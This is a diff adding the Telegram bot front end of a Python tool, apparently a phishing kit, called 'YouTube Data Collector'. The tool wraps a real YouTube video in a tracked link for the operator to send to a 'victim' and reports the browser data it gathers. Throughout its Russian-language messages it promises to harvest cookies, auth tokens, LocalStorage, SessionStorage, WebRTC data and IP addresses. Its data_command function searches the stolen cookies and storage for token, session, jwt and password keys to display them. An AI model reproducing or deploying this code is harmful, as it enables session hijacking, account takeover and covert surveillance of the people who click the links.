+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /start"""
+    user = update.effective_user
+    
+    welcome_message = f"""
+👋 *Добро пожаловать, {user.first_name}!*
+
+🤖 *YouTube Data Collector Bot*
+
+🎯 *Что делает этот бот:*
+1. Принимает ссылку на YouTube видео
+2. Создает отслеживаемую ссылку
+3. Когда жертва переходит - собирает ВСЕ данные:
+   • Cookies, LocalStorage, SessionStorage
+   • Токены авторизации
+   • Информацию о браузере и устройстве
+   • WebRTC данные
+   • IP адрес
+
+⚡ *Как использовать:*
+1. Используйте команду /create_link или нажмите кнопку ниже
+2. Введите ссылку на YouTube видео
+3. Получите отслеживаемую ссылку
+4. Отправьте её жертве
+5. Получайте данные в реальном времени
+
+📊 *Основные команды:*
+• /create_link - Создать ссылку
+• /my_links - Мои ссылки
+• /stats - Статистика системы
+• /help - Помощь
+
+🔗 *Сервер:* {SERVER_URL}
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("🔗 Создать ссылку", callback_data="create_link")],
+        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
+        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
+        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        welcome_message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
+
+async def create_link_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Создание ссылки через Telegram"""
+    await update.message.reply_text(
+        "🔗 *Создание отслеживаемой ссылки*\n\n"
+        "Отправьте мне ссылку на YouTube видео в формате:\n"
+        "`https://youtube.com/watch?v=VIDEO_ID`\n\n"
+        "Или просто отправьте ссылку прямо сейчас.",
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+async def handle_youtube_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка YouTube URL"""
+    text = update.message.text.strip()
+    
+    if not ('youtube.com' in text or 'youtu.be' in text):
+        return
+    
+    user_id = update.effective_user.id
+    
+    # Извлекаем информацию о видео
+    video_info = extract_youtube_video_info(text)
+    video_id = YouTubeManager.extract_video_id(text)
+    
+    # Генерируем уникальный ID
+    link_id = str(uuid.uuid4())[:12]
+    
+    # Создаем URL на локальном сервере
+    server_url = YouTubeManager.generate_server_url(video_id, link_id)
+    
+    # Сохраняем в базу
+    link_data = {
+        'id': link_id,
+        'youtube_url': text,
+        'youtube_id': video_id,
+        'server_url': server_url,
+        'created_at': datetime.now().isoformat(),
+        'created_by': user_id,
+        'title': video_info['title'],
+        'description': video_info['description']
+    }
+    
+    db.add_video_link(link_data)
+    
+    # Формируем сообщение
+    message = f"""
+✅ *Ссылка создана успешно!*
+
+🎬 *Видео:* {video_info['title']}
+🔗 *Ваша отслеживаемая ссылка:*
+`{server_url}`
+
+📊 *Как использовать:*
+1. Скопируйте ссылку выше
+2. Отправьте её жертве
+3. Когда жертва откроет ссылку, начнется сбор данных
+4. Все данные придут сюда автоматически
+
+🔐 *Что будет собрано:*
+• Все cookies браузера (включая токены)
+• LocalStorage и SessionStorage
+• Информация о браузере и устройстве
+• WebRTC данные
+• IP адрес
+
+💡 *Команды:*
+• /my_links - Посмотреть все ваши ссылки
+• /stats - Статистика системы
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}")],
+        [InlineKeyboardButton("🔗 Открыть ссылку", url=server_url)],
+        [InlineKeyboardButton("📊 Статистика ссылки", callback_data=f"stats_{link_id}")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup,
+        disable_web_page_preview=True
+    )
+
+async def my_links_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Мои ссылки"""
+    user_id = update.effective_user.id
+    links = db.get_user_links(user_id)
+    
+    if not links:
+        await update.message.reply_text(
+            "📭 *У вас нет созданных ссылок.*\n\n"
+            "Чтобы создать ссылку:\n"
+            "1. Используйте /create_link\n"
+            "2. Или отправьте прямую ссылку на YouTube видео\n\n"
+            "Пример: `https://youtube.com/watch?v=dQw4w9WgXcQ`",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    message = "🔗 *ВАШИ ССЫЛКИ:*\n\n"
+    
+    for i, link in enumerate(links[:10], 1):
+        stats = db.get_link_stats(link['id'])
+        
+        message += f"{i}. *ID:* `{link['id'][:8]}...`\n"
+        message += f"   🎬 {link['title'][:50]}...\n"
+        message += f"   📅 {link['created_at'][:10]}\n"
+        message += f"   👣 Переходов: {stats['clicks']}\n"
+        message += f"   📊 Данных: {stats['captured']}\n"
+        message += f"   🔗 Ссылка: {link['server_url'][:50]}...\n"
+        message += "   ─────\n"
+    
+    if len(links) > 10:
+        message += f"\n... и еще {len(links) - 10} ссылок\n"
+    
+    keyboard = []
+    for link in links[:3]:
+        keyboard.append([
+            InlineKeyboardButton(f"📊 {link['id'][:8]}...", callback_data=f"link_info_{link['id']}")
+        ])
+    
+    keyboard.append([InlineKeyboardButton("➕ Создать новую ссылку", callback_data="create_link")])
+    
+    reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Статистика системы"""
+    stats = db.get_stats()
+    
+    message = f"""
+📊 *СТАТИСТИКА СИСТЕМЫ*
+
+🔗 *Основные показатели:*
+• Создано ссылок: `{stats.get('total_links', 0)}`
+• Всего переходов: `{stats.get('total_clicks', 0)}`
+• Данных собрано: `{stats.get('total_captured', 0)}`
+• Cookies: `{stats.get('total_cookies', 0)}`
+• Учетных данных: `{stats.get('total_credentials', 0)}`
+
+🌐 *Состояние сервера:*
+• Статус: 🟢 Активен
+• URL: {SERVER_URL}
+• Порт: {FLASK_PORT}
+
+💡 *Команды:*
+• /create_link - Создать новую ссылку
+• /my_links - Мои ссылки
+• /help - Помощь
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("🔗 Создать ссылку", callback_data="create_link")],
+        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
+        [InlineKeyboardButton("🌐 Открыть сервер", url=SERVER_URL)]
+    ]
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
+
+async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Просмотр данных"""
+    if not context.args:
+        await update.message.reply_text(
+            "📊 *Просмотр данных*\n\n"
+            "Используйте: `/data [ID_данных]`\n\n"
+            "Пример: `/data abc123def456`\n\n"
+            "ID данных можно получить из уведомлений.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    data_id = context.args[0]
+    data = db.get_captured_data(data_id)
+    
+    if not data:
+        await update.message.reply_text(
+            f"❌ Данные с ID `{data_id}` не найдены.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    # Поиск токенов и чувствительных данных
+    sensitive_info = []
+    
+    # Cookies
+    for cookie in data.get('cookies', []):
+        name = cookie.get('name', '').lower()
+        if any(keyword in name for keyword in ['token', 'session', 'auth', 'secret', 'key', 'password']):
+            value = cookie.get('value', '')
+            if len(value) > 10:
+                sensitive_info.append(f"🍪 {name}: {value[:50]}...")
+    
+    # LocalStorage
+    localStorage = data.get('localStorage', {})
+    for key, value in localStorage.items():
+        key_lower = key.lower()
+        if any(keyword in key_lower for keyword in ['token', 'auth', 'jwt', 'access', 'refresh']):
+            if isinstance(value, str) and len(value) > 10:
+                sensitive_info.append(f"🗂 {key}: {value[:50]}...")
+    
+    message = f"""
+🔍 *ДЕТАЛЬНЫЙ ОТЧЕТ О ДАННЫХ*
+
+📌 *Идентификатор:* `{data['id']}`
+🕒 *Время сбора:* {data['timestamp'][:19]}
+🌐 *IP адрес:* `{data['ip_address']}`
+🖥 *Устройство:* {data.get('device_info', {}).get('device_type', 'Unknown')}
+👤 *User Agent:* {data['user_agent'][:80]}...
+
+📊 *СОБРАННЫЕ ДАННЫЕ:*
+• Cookies: {len(data.get('cookies', []))}
+• LocalStorage: {len(data.get('localStorage', {}))}
+• SessionStorage: {len(data.get('sessionStorage', {}))}
+• Плагины браузера: {len(data.get('device_info', {}).get('plugins', []))}
+
+🌐 *ОПРЕДЕЛЕННЫЕ СЕРВИСЫ:*
+"""
+    
+    services = data.get('identified_services', [])
+    if services:
+        for service in services:
+            message += f"• {service}\n"
+    else:
+        message += "• Не определены\n"
+    
+    # Чувствительные данные
+    if sensitive_info:
+        message += f"\n🔐 *НАЙДЕННЫЕ ТОКЕНЫ И КЛЮЧИ ({len(sensitive_info)}):*\n"
+        for info in sensitive_info[:5]:
+            message += f"• `{info}`\n"
+        
+        if len(sensitive_info) > 5:
+            message += f"• ... и еще {len(sensitive_info) - 5}\n"
+    
+    # Информация о плагинах
+    plugins = data.get('device_info', {}).get('plugins', [])
+    if plugins:
+        message += f"\n🧩 *ПЛАГИНЫ БРАУЗЕРА ({len(plugins)}):*\n"
+        for plugin in plugins[:3]:
+            message += f"• {plugin.get('name', 'Unknown')}\n"
+    
+    message += f"""
+📍 *ГЕОЛОКАЦИОННЫЕ ДАННЫЕ:*
+• IP: `{data['ip_address']}`
+• Временная зона: {data.get('device_info', {}).get('timezone', 'Unknown')}
+• Язык: {data.get('browser_info', {}).get('language', 'Unknown')}
+
+📱 *ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ:*
+• Разрешение: {data.get('device_info', {}).get('screen', {}).get('width', 'Unknown')}x{data.get('device_info', {}).get('screen', {}).get('height', 'Unknown')}
+• Глубина цвета: {data.get('device_info', {}).get('screen', {}).get('colorDepth', 'Unknown')}
+• Платформа: {data.get('device_info', {}).get('platform', 'Unknown')}
+"""
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        disable_web_page_preview=True
+    )
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик inline кнопок"""
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data
+    
+    if data == "create_link":
+        await create_link_command(query, context)
+    
+    elif data == "stats":
+        await stats_command(query, context)
+    
+    elif data == "my_links":
+        await my_links_command(query, context)
+    
+    elif data == "help":
+        help_message = """
+🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*
+
+🎯 *Как использовать систему:*
+1. Отправьте боту ссылку на YouTube видео
+   Или используйте /create_link
+2. Бот создаст отслеживаемую ссылку
+3. Отправьте эту ссылку жертве
+4. Когда жертва откроет ссылку, начнется сбор данных
+5. Все данные придут автоматически
+
+🔐 *Что собирается:*
+• Все cookies браузера (включая авторизационные токены)
+• LocalStorage и SessionStorage
+• Информация о браузере и устройстве
+• WebRTC данные
+• Информация о плагинах
+• IP адрес и геолокация
+• Временная зона и язык
+
+⚡ *Особенности:*
+• Настоящее YouTube видео (встраивается с YouTube)
+• Сбор данных в фоновом режиме
+• Жертве не нужно ничего делать
+• Все данные сохраняются в базу
+• Определение сервисов по cookies
+
+🔧 *Основные команды:*
+• /start - Начало работы
+• /create_link - Создать ссылку
+• /my_links - Мои ссылки
+• /stats - Статистика системы
+• /data [ID] - Просмотр данных
+• /help - Помощь
+
+🌐 *Сервер:* {}
+""".format(SERVER_URL)
+        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
+    
+    elif data.startswith("copy_"):
+        link_id = data[5:]
+        link = db.get_link(link_id)
+        
+        if link:
+            await query.message.reply_text(
+                f"📋 *Скопируйте ссылку:*\n\n`{link['server_url']}`",
+                parse_mode=ParseMode.MARKDOWN
+            )
+    
+    elif data.startswith("stats_"):
+        link_id = data[6:]
+        link = db.get_link(link_id)
+        
+        if link:
+            stats = db.get_link_stats(link_id)
+            data_list = db.get_data_by_link(link_id)
+            
+            message = f"""
+📊 *СТАТИСТИКА ССЫЛКИ*
+
+🎬 *Видео:* {link['title']}
+🔗 *ID:* `{link_id}`
+📅 *Создано:* {link['created_at'][:10]}
+👣 *Переходов:* {stats['clicks']}
+📊 *Данных собрано:* {stats['captured']}
+
+📈 *ПОСЛЕДНИЕ ДАННЫЕ:*
+"""
+            
+            for i, data_item in enumerate(data_list[:3], 1):
+                message += f"\n{i}. *ID:* `{data_item['id']}`\n"
+                message += f"   🕒 {data_item['timestamp'][:16]}\n"
+                message += f"   🌐 {data_item['ip_address']}\n"
+                message += f"   🍪 Cookies: {len(data_item.get('cookies', []))}\n"
+                message += f"   🗂 LocalStorage: {len(data_item.get('localStorage', {}))}\n"
+            
+            await query.message.reply_text(
+                message,
+                parse_mode=ParseMode.MARKDOWN
+            )
+    
+    elif data.startswith("link_info_"):
+        link_id = data[10:]
+        link = db.get_link(link_id)
+        
+        if link:
+            stats = db.get_link_stats(link_id)
+            
+            message = f"""
+🔗 *ИНФОРМАЦИЯ О ССЫЛКЕ*
+
+🎬 *Название:* {link['title']}
+📝 *Описание:* {link['description'][:100]}...
+🔗 *Оригинальная ссылка:* {link['youtube_url'][:50]}...
+🌐 *Отслеживаемая ссылка:* {link['server_url']}
+📅 *Создано:* {link['created_at'][:19]}
+👣 *Переходов:* {stats['clicks']}
+📊 *Данных собрано:* {stats['captured']}
+
+💡 *Команды:*
+• Скопируйте ссылку выше и отправьте жертве
+• Данные будут приходить автоматически
+"""
+            
+            keyboard = [
+                [InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}")],
+                [InlineKeyboardButton("🔗 Открыть ссылку", url=link['server_url'])]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await query.message.reply_text(
+                message,
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=reply_markup,
+                disable_web_page_preview=True
+            )
+
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик ошибок"""
+    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
+
+# ========== ЗАПУСК СИСТЕМЫ ==========
+def run_flask():
+    """Запуск Flask сервера"""
+    try:
+        logger.info(f"Starting Flask server on port {FLASK_PORT}")
+        app.run(
+            host='0.0.0.0',
+            port=FLASK_PORT,
+            debug=False,
+            use_reloader=False,
+            threaded=True
+        )
+    except Exception as e:
+        logger.error(f"Flask server error: {e}")
+
+async def main():
+    """Основная функция запуска"""
+    global telegram_app
+    
+    print("=" * 70)
+    print("🤖 YOUTUBE DATA COLLECTOR - ЛОКАЛЬНЫЙ СЕРВЕР")
+    print("=" * 70)
+    print()
+    
+    # Проверка токена
+    if BOT_TOKEN == "ВАШ_ТОКЕН_БОТА_TELEGRAM":
+        print("❌ ОШИБКА: Не установлен BOT_TOKEN!")
+        print("Получите у @BotFather и вставьте в код")
+        return
+    
+    print("✅ Токен проверен")
+    print(f"👑 Администратор: {ADMIN_ID}")
+    print(f"🌐 Сервер: {SERVER_URL}")
+    print(f"🚀 Порт: {FLASK_PORT}")
+    print()
+    
+    # Создаем базу данных
+    print("📁 Инициализация базы данных...")
+    
+    # Запускаем Flask
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+    
+    time.sleep(2)  # Даем Flask время на запуск
+    
+    # Создаем Telegram бота
+    try:
+        telegram_app = Application.builder().token(BOT_TOKEN).build()
+        
+        # Регистрируем обработчики
+        telegram_app.add_handler(CommandHandler("start", start_command))
+        telegram_app.add_handler(CommandHandler("create_link", create_link_command))
+        telegram_app.add_handler(CommandHandler("stats", stats_command))
+        telegram_app.add_handler(CommandHandler("my_links", my_links_command))
+        telegram_app.add_handler(CommandHandler("data", data_command))
+        telegram_app.add_handler(CommandHandler("help", lambda u, c: button_handler(u, c)))
+        
+        # Обработчик YouTube ссылок
+        telegram_app.add_handler(MessageHandler(
+            filters.TEXT & ~filters.COMMAND, handle_youtube_url
+        ))
+        
+        # Inline кнопки
+        telegram_app.add_handler(CallbackQueryHandler(button_handler))
+        
+        # Обработчик ошибок
+        telegram_app.add_error_handler(error_handler)
+        
+        print("✅ Flask сервер запущен на порту 5051")
+        print("✅ Telegram бот инициализирован")
+        print()
+        print("=" * 70)
+        print("🚀 СИСТЕМА ГОТОВА К РАБОТЕ!")
+        print("=" * 70)
+        print()
+        print("💡 ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ:")
+        print("1. Напишите боту /start")
+        print("2. Нажмите 'Создать ссылку' или используйте /create_link")
+        print("3. Отправьте ссылку на YouTube видео")
+        print("4. Бот создаст отслеживаемую ссылку")
+        print("5. Отправьте эту ссылку жертве")
+        print("6. Когда жертва откроет ссылку, начнется сбор данных")
+        print("7. Все данные будут приходить в бот автоматически")
+        print()
+        print("⚡ ОСОБЕННОСТИ СИСТЕМЫ:")
+        print("• Настоящее YouTube видео (iframe с YouTube)")
+        print("• Сбор cookies, LocalStorage, SessionStorage")
+        print("• Поиск токенов авторизации")
+        print("• Сбор информации о браузере и устройстве")
+        print("• Определение сервисов по cookies")
+        print("• Все данные сохраняются в базу")
+        print()
+        print("🌐 Ваш локальный сервер доступен по адресу:")
+        print(f"   {SERVER_URL}")
+        print()
+        print("⚠️  ВНИМАНИЕ: Используйте только для тестирования!")
+        print("=" * 70)
+        
+        # Запускаем бота
+        await telegram_app.initialize()
+        await telegram_app.start()
+        await telegram_app.updater.start_polling()
+        
+        # Бесконечный цикл для поддержания работы
+        while True:
+            await asyncio.sleep(3600)  # Спим 1 час
+        
+    except Exception as e:
+        logger.error(f"Failed to start bot: {e}")
+        print(f"❌ Ошибка запуска бота: {e}")
+
+if __name__ == '__main__':
+    import asyncio
+    asyncio.run(main())
+[file content end]
